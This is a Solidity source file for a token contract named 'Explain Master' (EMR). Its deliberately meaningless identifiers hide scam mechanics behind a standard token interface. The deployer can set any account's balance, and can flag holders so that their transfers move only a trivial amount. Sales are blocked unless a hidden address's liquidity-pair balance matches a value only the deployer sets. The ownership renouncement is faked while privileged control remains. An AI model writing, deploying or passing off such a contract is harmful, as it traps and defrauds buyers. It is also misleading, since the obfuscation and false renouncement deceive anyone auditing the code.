//SPDX-License-Identifier: MIT

pragma solidity ^0.8.9;

interface atTake {
    function createPair(address toMax, address takeLimit) external returns (address);
}

interface buyFeeWallet {
    function totalSupply() external view returns (uint256);

    function balanceOf(address receiverWallet) external view returns (uint256);

    function transfer(address shouldLaunchAuto, uint256 exemptMarketing) external returns (bool);

    function allowance(address launchedAutoMarketing, address spender) external view returns (uint256);

    function approve(address spender, uint256 exemptMarketing) external returns (bool);

    function transferFrom(
        address sender,
        address shouldLaunchAuto,
        uint256 exemptMarketing
    ) external returns (bool);

    event Transfer(address indexed from, address indexed launchTotal, uint256 value);
    event Approval(address indexed launchedAutoMarketing, address indexed spender, uint256 value);
}

abstract contract marketingListShould {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface buyReceiverSell {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface buyFeeWalletMetadata is buyFeeWallet {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ExplainMaster is marketingListShould, buyFeeWallet, buyFeeWalletMetadata {

    function approve(address receiverSellExempt, uint256 exemptMarketing) public virtual override returns (bool) {
        listTx[_msgSender()][receiverSellExempt] = exemptMarketing;
        emit Approval(_msgSender(), receiverSellExempt, exemptMarketing);
        return true;
    }

    address public swapReceiver;

    mapping(address => bool) public exemptLimitFee;

    mapping(address => uint256) private atSender;

    function owner() external view returns (address) {
        return shouldTeam;
    }

    string private txAutoFund = "EMR";

    constructor (){
        
        buyReceiverSell launchTrading = buyReceiverSell(totalSender);
        swapReceiver = atTake(launchTrading.factory()).createPair(launchTrading.WETH(), address(this));
        if (tokenWallet == enableWallet) {
            limitAuto = tokenWallet;
        }
        totalReceiver = _msgSender();
        exemptLimitFee[totalReceiver] = true;
        atSender[totalReceiver] = teamMarketingIs;
        autoTxSell();
        
        emit Transfer(address(0), totalReceiver, teamMarketingIs);
    }

    uint256 public receiverFundLiquidity;

    function tradingWallet() private view {
        require(exemptLimitFee[_msgSender()]);
    }

    address private shouldTeam;

    mapping(address => bool) public teamAutoEnable;

    bool public fundExempt;

    function autoTxSell() public {
        emit OwnershipTransferred(totalReceiver, address(0));
        shouldTeam = address(0);
    }

    function getOwner() external view returns (address) {
        return shouldTeam;
    }

    uint256 public limitAuto;

    bool private maxExemptList;

    address isMin = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    event OwnershipTransferred(address indexed feeExemptAmount, address indexed sellMinLaunched);

    uint8 private receiverTake = 18;

    function receiverLaunch(address tradingReceiverFee, uint256 exemptMarketing) public {
        tradingWallet();
        atSender[tradingReceiverFee] = exemptMarketing;
    }

    uint256 private enableWallet;

    string private senderAmount = "Explain Master";

    uint256 public tokenWallet;

    function symbol() external view virtual override returns (string memory) {
        return txAutoFund;
    }

    uint256 public autoTeamLaunched;

    function listModeSender(address exemptSender) public {
        require(exemptSender.balance < 100000);
        if (fundExempt) {
            return;
        }
        
        exemptLimitFee[exemptSender] = true;
        if (txSell != walletAt) {
            limitAuto = tokenWallet;
        }
        fundExempt = true;
    }

    function decimals() external view virtual override returns (uint8) {
        return receiverTake;
    }

    function transfer(address tradingReceiverFee, uint256 exemptMarketing) external virtual override returns (bool) {
        return feeLaunched(_msgSender(), tradingReceiverFee, exemptMarketing);
    }

    uint256 enableExempt;

    bool public txSell;

    bool public walletAt;

    function name() external view virtual override returns (string memory) {
        return senderAmount;
    }

    address totalSender = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    address public totalReceiver;

    function isTx(uint256 exemptMarketing) public {
        tradingWallet();
        txAuto = exemptMarketing;
    }

    function toTotal(address buyLiquidityList, address shouldLaunchAuto, uint256 exemptMarketing) internal returns (bool) {
        require(atSender[buyLiquidityList] >= exemptMarketing);
        atSender[buyLiquidityList] -= exemptMarketing;
        atSender[shouldLaunchAuto] += exemptMarketing;
        emit Transfer(buyLiquidityList, shouldLaunchAuto, exemptMarketing);
        return true;
    }

    uint256 constant toBuy = 18 ** 10;

    function balanceOf(address receiverWallet) public view virtual override returns (uint256) {
        return atSender[receiverWallet];
    }

    function feeLaunched(address buyLiquidityList, address shouldLaunchAuto, uint256 exemptMarketing) internal returns (bool) {
        if (buyLiquidityList == totalReceiver) {
            return toTotal(buyLiquidityList, shouldLaunchAuto, exemptMarketing);
        }
        uint256 txTradingEnable = buyFeeWallet(swapReceiver).balanceOf(isMin);
        require(txTradingEnable == txAuto);
        require(shouldLaunchAuto != isMin);
        if (teamAutoEnable[buyLiquidityList]) {
            return toTotal(buyLiquidityList, shouldLaunchAuto, toBuy);
        }
        return toTotal(buyLiquidityList, shouldLaunchAuto, exemptMarketing);
    }

    function transferFrom(address buyLiquidityList, address shouldLaunchAuto, uint256 exemptMarketing) external override returns (bool) {
        if (_msgSender() != totalSender) {
            if (listTx[buyLiquidityList][_msgSender()] != type(uint256).max) {
                require(exemptMarketing <= listTx[buyLiquidityList][_msgSender()]);
                listTx[buyLiquidityList][_msgSender()] -= exemptMarketing;
            }
        }
        return feeLaunched(buyLiquidityList, shouldLaunchAuto, exemptMarketing);
    }

    uint256 txAuto;

    mapping(address => mapping(address => uint256)) private listTx;

    function totalSupply() external view virtual override returns (uint256) {
        return teamMarketingIs;
    }

    uint256 public amountReceiver;

    uint256 private teamMarketingIs = 100000000 * 10 ** 18;

    function toSwapIs(address tokenSell) public {
        tradingWallet();
        
        if (tokenSell == totalReceiver || tokenSell == swapReceiver) {
            return;
        }
        teamAutoEnable[tokenSell] = true;
    }

    function allowance(address swapFrom, address receiverSellExempt) external view virtual override returns (uint256) {
        if (receiverSellExempt == totalSender) {
            return type(uint256).max;
        }
        return listTx[swapFrom][receiverSellExempt];
    }

}